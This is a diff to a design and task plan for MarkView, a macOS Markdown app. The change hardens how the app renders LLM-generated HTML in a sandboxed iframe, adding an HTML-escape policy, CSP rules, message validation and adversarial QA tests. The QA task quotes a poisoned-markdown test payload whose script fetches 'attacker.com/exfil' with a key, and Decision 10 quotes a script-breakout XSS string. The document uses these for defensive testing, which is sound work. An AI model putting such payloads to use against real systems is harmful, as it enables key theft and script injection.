@@ -84,11 +84,13 @@ Tests still deferred per v1 Decision 9 — the XCTest target is still absent. Th
 6. Iframe-side handler receives, finds the placeholder by id, appends content. When section completes (server-sent `[SECTION_DONE]` sentinel or stream end), iframe initializes any required lib (e.g. `mermaid.run({nodes:[node], securityLevel:'strict'})` for mermaid sections; `new Chart(canvas, config)` for chart sections).
 7. When all sections complete, `session.allSectionsReady = true`; cache write triggered.
 
-**Disk cache write:**
+**Disk cache write (deterministic rebuild only):**
 
-1. `session.captureFinalHTML()` requests the iframe's full final HTML via `bridge.captureInsightHTML` → JS sends back `iframe.srcdoc` plus any DOM-mutated state (or, simpler: parent re-builds the HTML from skeleton + section buffers + chrome template — deterministic).
+1. `session.buildFinalHTML(node:)` deterministically composes the cached HTML on the parent side from: (a) skeleton (validated, JSON-parsed structure); (b) section buffers (`currentNodeSections[id].buffer` for each section); (c) chrome template (breadcrumbs, status bar — same template parent uses for srcdoc). All LLM-controlled string fields (skeleton.title, section.title, deepDiveTopic.label, deepDiveTopic.hint, scopeHint paths displayed in chrome) are HTML-escaped via a single utility before being interpolated into the HTML — see Decision 10 v2.
 2. `cache.writeNode(nodeId:, html:)` writes atomically: `<sessionUUID>/nodes/<nodeUUID>.html.tmp`, then rename to `.html`.
 3. `cache.updateManifest(_:)` appends node entry (id, parentId, title, level, createdAt) atomically.
+
+**Note:** the spec deliberately does NOT add a 6th postMessage type to round-trip the iframe's actual DOM back to parent — that would violate the 5-type allowlist. The deterministic rebuild approach is the only sanctioned path; section content from LLM is preserved verbatim as it arrived (the `currentNodeSections[id].buffer`), already inside the iframe trust boundary.
 
 **Navigation:**
 
@@ -210,6 +212,34 @@ Tests still deferred per v1 Decision 9 — the XCTest target is still absent. Th
 **Alternatives considered:**
 - Refactor AIProviderClient to a unified "completion request" API. Rejected: large blast radius for a v2 feature; existing extractSingleChunk callers are stable.
 
+### Decision 10: HTML-escape policy for parent-rendered LLM strings
+
+**Decision:** A single utility `escapeForHTMLAttribute(_:)` and `escapeForHTMLText(_:)` is used for EVERY LLM-controlled string interpolated into iframe srcdoc, status-bar chrome, breadcrumb chrome, exported ZIP HTML, and `manifest.json` HTML escaping. Affected fields: `InsightSkeleton.title`, `InsightSection.title`, `DeepDiveTopic.label`, `DeepDiveTopic.hint`, `scopeHint` paths displayed to user, `node.title`, error messages from LLM.
+
+**Rationale:** The iframe sandbox protects against script execution, but the iframe srcdoc is constructed parent-side from string concatenation. If LLM emits a label containing `</script><script>alert(1)</script>`, parent could inject it into srcdoc string, breaking out of attribute or text context. Sandbox engages AFTER the srcdoc is parsed by the iframe — too late if the breakout already corrupted the DOM structure (e.g. caused parent's chrome breadcrumbs to render the injected script in MAIN frame).
+
+Concretely:
+- `escapeForHTMLAttribute`: `&` → `&amp;`, `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`, `'` → `&#39;`
+- `escapeForHTMLText`: same set
+- Used at every `String → HTML` interpolation in: parent JS chrome rendering (breadcrumbs at top, status bar at bottom — these live in MAIN frame, not iframe), iframe srcdoc construction (LLM strings embedded into placeholder text/title attrs), exported ZIP HTML (same), `manifest.json` titles (preserved as JSON which has its own escape — no HTML escape needed in JSON, but when rebuilt into HTML for ZIP, escape applies).
+
+**Alternatives considered:**
+- Trust LLM output, skip escaping. Rejected: trivial XSS via poisoned `.md` content makes parent breadcrumbs execute injected script.
+- Block all `<` characters in LLM strings. Rejected: legitimate technical content (e.g. "compare A < B") should display.
+
+### Decision 11: Blob URL lifecycle
+
+**Decision:** Blob URLs for vendored libs are owned by the parent JS context for the lifetime of the insight tab. Created lazily when first needed by `bridge.loadInsightSkeleton` — only libs required by the skeleton's section types are materialized (Mermaid only if `mermaidDiagram`, Chart only if `chartJsChart`, KaTeX only if any section emits math content per skeleton metadata, Prism unconditionally for code highlighting). Blob URLs are revoked via `URL.revokeObjectURL(blobURL)` in two places:
+
+1. When session navigates to a different node that has a different lib subset — revoke unused libs, create new blobs as needed
+2. When the insight tab is closed — `tabsStore.removeTab` triggers EditorView teardown, which calls a parent JS function `window.releaseInsightBlobs()` that revokes ALL blob URLs created for that session. EditorView calls this BEFORE `session.cancel()` to ensure no in-flight Combine sub fires after revocation.
+
+**Rationale:** `URL.createObjectURL` retains the blob's bytes in WebView memory until explicitly revoked or page unloaded. Without revocation, every closed insight tab leaks the libs (~4MB×N tabs). Two-stage revocation handles both navigation (lazy reload) and termination (full release).
+
+**Alternatives considered:**
+- Always create all 4 libs at session start; revoke at end. Rejected: wastes ~3MB per session (KaTeX+Chart+Prism unused if skeleton doesn't need them).
+- Skip revocation, trust WebView GC at page unload. Rejected: WebView in MarkView is long-lived (single instance), page never unloads — leaks accumulate.
+
 ### Decision 9: Tests still deferred
 
 **Decision:** No XCTest files added in v2. The existing follow-up task in `tasks/todo.md` expands to cover v2-specific paths.
@@ -257,10 +287,10 @@ struct DeepDiveTopic: Codable, Identifiable {
     let scopeHint: [String]
 }
 
-struct SectionState {
+struct SectionState: Codable {
     var buffer: String = ""  // accumulated HTML content
     var status: Status = .pending
-    enum Status { case pending, streaming, ready, failed }
+    enum Status: String, Codable { case pending, streaming, ready, failed }
 }
 
 @MainActor
@@ -288,6 +318,7 @@ final class InsightSession: ObservableObject, Identifiable {
 
     init(folderURL: URL, mdFiles: [URL], providerClient: AIProviderClient,
          graphRAG: GraphRAG?, cache: InsightCache)
+    // apiKeySnapshot captured from providerClient.apiKeySnapshot in init body (private setter only)
 
     // Public methods (parallel structure to v1 — adapted for two-phase)
     func generateRoot() async
@@ -477,7 +508,7 @@ No Playwright, no Telegram, no Docker. Desktop macOS app, manual UI verification
 
 | Risk | Mitigation |
 |------|-----------|
-| WKWebView iframe sandbox may auto-inject `webkit.messageHandlers` (untested without spike per user opt-out) | Defense-in-depth `frameInfo.isMainFrame` guard in all v2 bridge handlers (Decision 3). Manual smoke during QA: poison a `.md` file → run insight → check no spurious bridge calls reach Swift. If WebKit semantics surprise us, rework time ~1 hour (constrain WKWebViewConfiguration). |
+| WKWebView iframe sandbox may auto-inject `webkit.messageHandlers` (untested without spike per user opt-out) | Defense-in-depth `frameInfo.isMainFrame` guard in all v2 bridge handlers (Decision 3) + parent JS `event.source === iframe.contentWindow && event.origin === 'null'` validation. Manual smoke during QA: poison a `.md` file → run insight → check no spurious bridge calls reach Swift. If WebKit semantics surprise us, rework constrains WKWebViewConfiguration to disable per-frame bridge inheritance. |
 | Anthropic tool_use returns malformed input (vanishingly rare, but possible) | Defensive parser produces "single prose section" fallback InsightSkeleton on parse failure; logs warning; user still sees content (just less structured). |
 | Phase 2 N parallel calls hit Anthropic rate limit | Cap concurrent at 5 (gated scheduling in withThrowingTaskGroup, pattern from GraphRAG v1 round-1 fix). On 429 from one section: that section enters `.failed` with "rate limit, retry"; other sections continue. |
 | Pre-bundled libs distribution: KaTeX webfonts in iframe blob context | Validate during T5; if blob URL doesn't carry fonts, base64-inline `.woff2` files in srcdoc. |
@@ -488,7 +519,13 @@ No Playwright, no Telegram, no Docker. Desktop macOS app, manual UI verification
 | LLM-generated HTML triggers infinite loop / spam alerts | Sandbox blocks `alert()` (no allow-modals). Infinite loop blocks JS thread within iframe only — parent UI remains responsive. User can close tab. Iframe load timeout (10s) → if `insightIframeReady` not received, parent shows "iframe failed to load" error. |
 | Tab close while phases in flight | session.cancel() cancels all parallel section tasks (cooperative cancellation, observed at next stream chunk); awaits pending writes; cache.cleanup; tabsStore.removeTab. ARC frees iframe + session. |
 | Stale cache from previous app crash | At session start, `cache.init` creates a fresh directory using current sessionUUID; old dirs are not reused or read. Periodic GC of `.insight-cache/` deferred. |
-| Tests deferred — same risks as v1 (silent SSE bugs, etc.) | Audit Wave + manual QA + Instruments leak check. Follow-up task in `tasks/todo.md` expanded with v2-specific paths (Decision 9). |
+| Tests deferred — v2 surface larger than v1 | Audit Wave + manual QA + Instruments leak check. Follow-up task in `tasks/todo.md` expanded with v2-specific paths (Decision 9). T8 explicitly performs the `tasks/todo.md` rewrite (removes dead v1 modules, adds v2 paths). T12 adds 4 adversarial scenarios beyond happy-path. |
+| Cache cleanup races in-flight Phase 2 writes | `closeTab` insight branch awaits a synchronous flush flag from `cache.cleanup`: `await session.cancel()` (which awaits all section tasks to observe Task.isCancelled and exit), THEN `try? cache.cleanup()`, THEN `tabsStore.removeTab`. If a write was mid-flight, it completes via the `.tmp` file but the rename is skipped (cleanup also removes orphan `.tmp` files). |
+| In-flight ZIP `Process` not cancelled on tab close | `InsightArchiveExporter.bundle` runs as a separate Task; `session.cancel()` cancels it; on cancel, the task spawns a final cleanup of the staging temp dir + any partial `.zip.tmp` at user destination. |
+| Blob URL revocation missed on tab close | Decision 11 §2: `closeTab` insight branch calls parent JS `window.releaseInsightBlobs()` BEFORE `session.cancel()`. Acceptance criterion enforces. |
+| Vendored libs CVE/dependency check | One-time at vendor: `npm audit` or manual GitHub security advisories check. Recorded in `vendor/MANIFEST.txt` with date + result. Re-checked when libs are bumped. |
+| Iframe load timeout — iframe never sends `insightIframeReady` | 10s parent timer. On expiry: setInsightError("iframe load failed, retry"), destroy + recreate iframe empty. Documented in Acceptance Criteria. |
+| Parent JS chrome (breadcrumbs / status bar) renders LLM strings via textContent (sandbox does not protect chrome) | Decision 10 mandates escape utility. Acceptance Criterion audits all interpolation sites. |
 | ARC retain cycle from new InsightCache reference | InsightSession holds `cache` strongly (not weak — cache outlives session use); cache holds no reference to session. `[weak self]` in all session closures (preserved from v1). |
 
 ## Acceptance Criteria
@@ -519,13 +556,33 @@ Technical acceptance (in addition to user-spec criteria):
 - [ ] When section completes, JS initializes corresponding lib (Mermaid render, Chart.js draw, KaTeX render)
 - [ ] All sections complete → `session.allSectionsReady = true`; cache write triggered
 
-**Iframe sandbox security (Decisions 2 + 3):**
-- [ ] iframe srcdoc starts with `<iframe sandbox="allow-scripts">` exactly (no allow-same-origin, no allow-popups, no allow-forms, no allow-modals, no allow-top-navigation)
-- [ ] iframe srcdoc CSP meta has: `default-src 'self'; script-src 'self' 'unsafe-inline' blob:; style-src 'self' 'unsafe-inline'; connect-src 'none'; img-src 'self' data: blob:; object-src 'none'; base-uri 'none'`
+**Iframe sandbox security (Decisions 2 + 3 + 10 + 11):**
+- [ ] iframe srcdoc element has `sandbox="allow-scripts"` exactly (no allow-same-origin, no allow-popups, no allow-forms, no allow-modals, no allow-top-navigation)
+- [ ] iframe srcdoc CSP meta has: `default-src 'none'; script-src 'unsafe-inline' blob:; style-src 'unsafe-inline'; connect-src 'none'; img-src data: blob:; object-src 'none'; base-uri 'none'; frame-ancestors 'none'` (note: `'self'` is meaningless in null-origin frame so removed; `'unsafe-inline'` accepted as the LLM is intentionally trusted to provide inline JS within sandbox boundary; defense remains: sandbox null-origin + connect-src 'none' + no allow-same-origin)
 - [ ] Every WebViewBridge handler for v2 message types has `guard message.frameInfo.isMainFrame else { return }` at entry
+- [ ] Parent JS `window.addEventListener('message', handler)` validates `event.source === iframe.contentWindow` AND `event.origin === 'null'` (sandbox iframe origin) — rejects other sources
 - [ ] postMessage allowlist exactly 5 types: insightIframeReady, insightDeepDiveClicked, insightBreadcrumbClicked, insightRequestSave, insightRequestUp
-- [ ] Each type's payload schema validated parent-side; malformed payloads rejected
-- [ ] `insightDeepDiveClicked` validates `topicIndex` against current skeleton's section.deepDiveTopics bounds; out-of-range rejected
+- [ ] Each type's payload schema validated parent-side; malformed payloads rejected with NSLog warning (sanitized)
+- [ ] `insightDeepDiveClicked` validates: `sectionId` is a known id in current skeleton; `topicIndex` is within bounds of `skeleton.sections[sectionId].deepDiveTopics`
+- [ ] `insightBreadcrumbClicked` validates: `nodeId` matches UUID regex; `nodeId` is present in session manifest (`session.nodes[uuid]` exists); reject otherwise
+
+**HTML-escape policy (Decision 10):**
+- [ ] Single utility `escapeForHTMLAttribute(_:)` and `escapeForHTMLText(_:)` exist in parent JS (and equivalent Swift helpers if used during HTML build)
+- [ ] Used at every interpolation of LLM-controlled strings: skeleton.title, section.title, deepDiveTopic.label/hint, scopeHint paths, error messages, node.title in breadcrumbs, exported ZIP HTML
+- [ ] Audit: grep for `${...}` template-string interpolations of LLM strings — every one must go through escape utility
+- [ ] Exported ZIP `index.html` and `nodes/*.html` go through the same escape pipeline
+
+**LLM CDN injection sanitization (runtime enforcement):**
+- [ ] In `bridge.updateInsightSection`, parent strips any `<script src="https://...">` (and `src="http://"`, `src="//..."`) from htmlChunk BEFORE forwarding to iframe via postMessage. Replaces with HTML comment `<!-- script src stripped: <url> -->` for visibility. CSP `connect-src 'none'` is defense-in-depth, not the only barrier.
+- [ ] Strip also: `<link rel="prefetch">`, `<link rel="preconnect">`, `<link rel="dns-prefetch">` to prevent DNS leak.
+
+**Blob URL lifecycle (Decision 11):**
+- [ ] `URL.createObjectURL` called lazily based on skeleton section types
+- [ ] On node navigation (currentNodeId change): unused libs revoked, new libs created
+- [ ] On `closeTab` insight branch: parent JS `window.releaseInsightBlobs()` called BEFORE `session.cancel()`; revokes ALL session blob URLs
+
+**Iframe load timeout:**
+- [ ] After parent sets iframe.srcdoc, parent starts a 10-second timer. If `insightIframeReady` not received → parent shows error "iframe load failed" via setInsightError; iframe is destroyed and recreated empty.
 
 **Disk cache (Decision 4):**
 - [ ] On Phase 2 completion, full HTML (parent-built deterministically from skeleton + section buffers + chrome) written atomically to `<workspace>/.insight-cache/<sessionUUID>/nodes/<nodeUUID>.html`
@@ -576,9 +633,9 @@ Technical acceptance (in addition to user-spec criteria):
 - **Files to read:** `MarkView/Models/AIProviderClient.swift` (existing patterns: extractSingleChunk request shape, streamCompletion sanitize, AIProviderError cases)
 
 #### Task 2: Vendor Chart.js 4.x + libs MANIFEST
-- **Description:** Download Chart.js 4.4.x minified from `cdn.jsdelivr.net/npm/chart.js@4.4` into `MarkView/Resources/Editor/vendor/js/chart-4.4.x.min.js`. Compute SHA-256, record in new `MarkView/Resources/Editor/vendor/MANIFEST.txt` along with existing Mermaid + KaTeX + Prism versions and SHAs. Register the new file in Xcode project's Sources build phase so it's copied into app bundle.
+- **Description:** Download Chart.js 4.4.x minified from `cdn.jsdelivr.net/npm/chart.js@4.4` into `MarkView/Resources/Editor/vendor/js/chart-4.4.x.min.js`. Compute SHA-256, record in new `MarkView/Resources/Editor/vendor/MANIFEST.txt` along with existing Mermaid + KaTeX + Prism versions and SHAs. Note CVE check date and result for each lib. Register the new file in Xcode project's Sources build phase so it's copied into app bundle. Verify-smoke: `shasum -a 256 MarkView/Resources/Editor/vendor/js/chart-*.min.js` matches MANIFEST.txt entry.
 - **Skill:** code-writing
-- **Reviewers:** code-reviewer, security-auditor
+- **Reviewers:** code-reviewer, security-auditor, test-reviewer
 - **Files to modify:** `MarkView/Resources/Editor/vendor/js/chart-4.4.x.min.js` (new), `MarkView/Resources/Editor/vendor/MANIFEST.txt` (new), `MarkView.xcodeproj/project.pbxproj`
 - **Files to read:** `MarkView/Resources/Editor/index.html` (existing vendored lib references), `MarkView/Resources/Editor/vendor/` directory listing
 
@@ -626,8 +683,8 @@ Technical acceptance (in addition to user-spec criteria):
 
 ### Wave 5 (depends on T6, T7)
 
-#### Task 8: WorkspaceManager v2 wiring + ZIP export
-- **Description:** Adapt 5 forwarders in `WorkspaceManager.swift` to new v2 bridge payloads (deepDiveClicked carries sectionId+topicIndex; save now exports archive). Add `try? session.cache.cleanup()` in `closeTab` insight branch BEFORE `tabsStore.removeTab` (Decision 11 §4 ordering preserved). Replace `saveInsightNode` with `exportInsightArchive(sessionId:)`: NSSavePanel (default `<folderName>_insight_<timestamp>.zip`), then `cache.archiveStagingDirectory()` builds tmp staging dir, then `InsightArchiveExporter.bundle(stagingURL:to:)` spawns zip and atomic moves to user URL. Inherit all 9 v1 insight-tab disk-write guards unchanged. Add `MarkView/Models/InsightArchiveExporter.swift` (new) implementing `bundle(stagingURL:to:)` via Process + /usr/bin/zip + atomic move.
+#### Task 8: WorkspaceManager v2 wiring + ZIP export + tasks/todo.md update
+- **Description:** Adapt 5 forwarders in `WorkspaceManager.swift` to new v2 bridge payloads (deepDiveClicked carries sectionId+topicIndex with bounds + manifest validation; breadcrumbClicked validates nodeId UUID + manifest membership; save now exports archive). Add ordered insight-cleanup in `closeTab` insight branch: parent JS `window.releaseInsightBlobs()` (via `bridge.releaseInsightBlobs(into:)` evaluateJavaScript) → `await session.cancel()` (awaits all parallel tasks) → `try? session.cache.cleanup()` → `tabsStore.removeTab`. Replace `saveInsightNode` with `exportInsightArchive(sessionId:)`: NSSavePanel (default `<folderName>_insight_<timestamp>.zip`); `cache.archiveStagingDirectory()` builds staging dir with deterministically-rebuilt HTML (per Decision 10 escape utility); `InsightArchiveExporter.bundle(stagingURL:to:)` spawns `/usr/bin/zip` via Process with explicit argument array (NEVER `/bin/sh -c` to avoid command injection); atomic move .zip.tmp → final URL on success. Process is cancellable: if user closes tab during export, in-flight Process killed + staging + .zip.tmp cleaned. Inherit all 9 v1 insight-tab disk-write guards unchanged. Add `MarkView/Models/InsightArchiveExporter.swift` (new). **Also:** rewrite `tasks/todo.md` to remove v1-only test scope (dead InsightMarkerParserTests, etc.) and add v2 paths (Anthropic tool_use parsing + skeleton schema + fallback, postMessage allowlist + payload schemas + frameInfo + event.source/origin defense, InsightCache atomic CRUD + manifest, ZIP export staging + HTML rewriting + escape policy, blob URL lifecycle, Phase 2 parallelism cap, iframe srcdoc CSP, iframe load timeout).
 - **Skill:** code-writing
 - **Reviewers:** code-reviewer, security-auditor, test-reviewer
 - **Files to modify:** `MarkView/Models/WorkspaceManager.swift`, `MarkView/Models/InsightArchiveExporter.swift` (new), `MarkView/Views/EditorView.swift` (5 delegate stub bodies adapted to new payloads)
@@ -653,6 +710,6 @@ Technical acceptance (in addition to user-spec criteria):
 ### Final Wave
 
 #### Task 12: Pre-deploy QA
-- **Description:** Acceptance testing for v2: build clean (xcodebuild Debug 0 errors, 0 new warnings in modified files); Anthropic tool_use endpoint smoke (curl per Verify-smoke); SHA-256 verify Chart.js against MANIFEST.txt; storage spot-check (no insight tables in `state.db`, no insight-prefix artifacts); static grep checks (iframe sandbox attribute, frameInfo guard in WebViewBridge, postMessage allowlist exactly 5 types, libs paths point to vendor/ not CDN, CSP meta in iframe template); **mandatory Instruments → Allocations leak check across 5 scenarios**: (a) open insight node + expand 2-3 + close, (b) error path (kill network mid Phase 2) + retry + close, (c) 4th retry within 60s rate-limit + close, (d) export ZIP archive + close, (e) navigate back via breadcrumb (cache load) + close — each scenario: force GC, verify zero retained `InsightSession`/`InsightNode`/`InsightCache`. Verify exported ZIP opens in Safari with full breadcrumb navigation working locally. Verify all user-spec acceptance criteria via manual flow on `TestFiles/`. Carry-over from v1 audit: M1 race (deep-dive payload now has sectionId+topicIndex which is more specific — verify race resolved or document as still present). Write report `logs/qa/pre-deploy-qa-report.md`.
+- **Description:** Acceptance testing for v2: build clean (xcodebuild Debug 0 errors, 0 new warnings in modified files); Anthropic tool_use endpoint smoke (curl per Verify-smoke); SHA-256 verify Chart.js against MANIFEST.txt; storage spot-check (no insight tables in `state.db`, no insight-prefix artifacts); static grep checks (iframe sandbox attribute, frameInfo guard in WebViewBridge, postMessage allowlist exactly 5 types, libs paths point to vendor/ not CDN, CSP meta in iframe template, escape utility used at all LLM-string interpolation sites). **Mandatory Instruments → Allocations leak check across 9 scenarios**: **happy path** — (a) open insight node + expand 2-3 + close, (b) error path (kill network mid Phase 2) + retry + close, (c) 4th retry within 60s rate-limit + close, (d) export ZIP archive + close, (e) navigate back via breadcrumb (cache load) + close. **Adversarial:** (f) poisoned `.md` file with embedded `<script>fetch("https://attacker.com/exfil?key="+...)</script>` and `</script><script>...` and `</label></section><script>` — verify (1) script does not execute in parent (sandbox blocks; chrome escape blocks); (2) connect-src 'none' blocks fetch attempts; (3) NSLog shows no exfil; (g) rapid double-click on a 🤿 deep-dive button — verify only one expansion fires (M1-class race resolved); (h) close tab during in-flight ZIP export — verify Process killed, staging dir + .zip.tmp cleaned, no partial file at user destination; (i) close tab during Phase 2 streaming — verify all parallel section tasks observe cancellation, cache cleanup waits for in-flight writes to complete or be discarded, no leftover .tmp files. Each scenario: force GC, verify zero retained `InsightSession`/`InsightNode`/`InsightCache`. Verify exported ZIP opens in Safari with full breadcrumb navigation. Verify all user-spec acceptance criteria via manual flow on `TestFiles/`. Verify `tasks/todo.md` updated with v2 paths (Decision 9 + T8). Write report `logs/qa/pre-deploy-qa-report.md`.
 - **Skill:** pre-deploy-qa
 - **Reviewers:** none
